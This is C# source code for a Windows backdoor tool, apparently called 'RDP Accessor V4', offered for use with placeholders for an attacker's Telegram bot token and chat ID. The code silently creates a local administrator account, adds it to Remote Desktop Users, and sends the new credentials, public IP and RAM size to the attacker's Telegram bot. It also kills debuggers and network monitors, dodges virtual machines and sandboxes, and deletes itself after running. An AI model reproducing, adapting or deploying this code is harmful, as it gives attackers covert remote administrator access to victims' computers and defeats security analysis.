using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Threading;

namespace localhost
{
    internal static class Program
    {

        private static readonly string Token = "token_bot"; // Your token bot ( @BotFather )
        private static readonly string ID = "chatid_user"; // Your chat-id ( @getmyid_bot )

        private static readonly string newUserName = "zxc_user"; // Any username ( ex. kevin )
        private static readonly string newUserPass = "zxc_pass"; // Any password ( ex. mitnik )

        private static readonly string mutex = "zxc_mutex"; // Mutex
        private static readonly string regkey = @"SOFTWARE\mmts"; // Reg-Path to Key

        
        private static void Main()
        {
            CheckAnalysis(); // Check for simple anti-vm/anyrun/debug methods.

            try
            {
                ClientEnabler(); // Check Mutex
                CreateTicket(); // Create-Admin User

                AllowRem(); // Enable User to " Remote Desktop Users" Group
                ClientMessager(); // Send data in telegram-bot
                SelferClient(); // Auto-Self delete
            }
            catch
            {
                SelferClient(); // if we failed to create admin-user in rdp, program automaticly self-delete.
            }
        }

        private static void CreateTicket() // Add admin function
        {
            RunPS($"net user {newUserName} {newUserPass} /add");
            RunPS($"net localgroup Administrators {newUserName} /add");
        }

        private static void AllowRem() // Allow remote access function
        {
            RunPS($"net localgroup \"Remote Desktop Users\" {newUserName} /add");
        }


        private static void ClientMessager() // Send message in telegram function
        {
            string ram = GetRAM();
            string value = $"===[ ]===[ RDP ACCESSOR V4 LOG ]===[ ]===\n[+]  Username => {newUserName}\n[+]  Password => {newUserPass}\n[+]  IP => {Get("https://api.ipify.org/")}\n[+]  RAM => {ram}\n===[ ]===[ NEW ADMIN-USER LOG ]===[ ]===";

            using (WebClient webClient = new WebClient())
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                webClient.DownloadString($"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={WebUtility.UrlEncode(value)}");
            }
        }


        public static void ClientEnabler() // Function for create mutex
        {
             // Path to key

            if (ClientExist(mutex, regkey))
            {
                SelferClient();
            }
            CreateSolution(mutex, regkey);

        }
        private static bool ClientExist(string mutexName, string registryKeyPath) // Check mutex key
        {
            using (var registryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath))
            {
                return registryKey.GetValue(mutexName) != null;
            }
        }

        private static void CreateSolution(string mutexName, string registryKeyPath) // Add mutex in first start
        {
            Mutex mutex;

            mutex = new Mutex(true, mutexName);

            using (var registryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath))
            {
                registryKey.SetValue(mutexName, 1);
            }
        }


        private static void CheckAnalysis() // Simple anti-dbg/vm/anyrun methods. (SIMPLE!)
        {
            if (VMClient() || ClientAny())
            {
                SelferClient();
            }
            CheckClient();
        }

        public static bool CheckClient() // Detect forbidden process
        {
            string[] fckProcess = {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
            };

            var processes = Process.GetProcesses();

            foreach (var processName in fckProcess)
            {
                foreach (var process in processes)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        try
                        {
                            process.Kill();
                            process.Dispose();
                        }
                        catch { }

                        return true;
                    }
                }
            }

            return false;
        }

        private static bool ClientAny() // Detect anyrun
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return false;
                }
            }

            return Environment.UserName.Equals("admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC");
        }

        private static bool VMClient() // Detect VM
        {
            string[] vmProcesses = {
                "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
                "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
                "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
                "VBoxTray", "rdpclip",
            };
            var processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                foreach (var processName in vmProcesses)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        return true;
                    }
                }
            }

            return false;
        }

        private static void RunPS(string args) // Run powershell | auxiliary function
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            process.WaitForExit();
        }

        private static string GetRAM() // Get Ram
        {
            try
            {
                double totalPhysicalMemory = 0;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject managementObject in managementObjectSearcher.Get())
                    {
                        totalPhysicalMemory = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
                    }
                }
                return ((int)((totalPhysicalMemory / 1048576.0) - 1)).ToString("#,GB");
            }
            catch
            {
                throw;
            }
        }

        private static string Get(string uri) // Get currently IP-Machine
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString(uri);
            }
        }

        private static void SelferClient() // Self delete auxiliary function
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            SelfTicket(fileName, 1);
            Environment.Exit(0);
        }

        private static void SelfTicket(string fileName, int delaySecond = 2) // zxccxz, fck,zxc,zxcz,hahaa
        {
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);
            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
        }

    }
}
